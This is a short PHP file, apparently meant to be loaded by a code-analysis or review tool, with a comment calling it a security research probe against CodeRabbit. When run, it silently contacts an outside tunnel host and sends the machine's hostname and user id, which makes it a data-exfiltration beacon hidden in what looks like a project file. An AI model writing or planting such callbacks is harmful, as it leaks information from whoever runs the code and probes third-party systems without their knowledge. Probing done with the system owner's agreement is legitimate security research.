<?php
// Security research probe for CodeRabbit (own repo). One callback, hostname and uid only.
@file_get_contents('https://qjtec-223-233-81-254.free.pinggy.net/cb/phpstan?h=' . urlencode((string) gethostname()) . '&u=' . (function_exists('posix_getuid') ? posix_getuid() : 'na'));
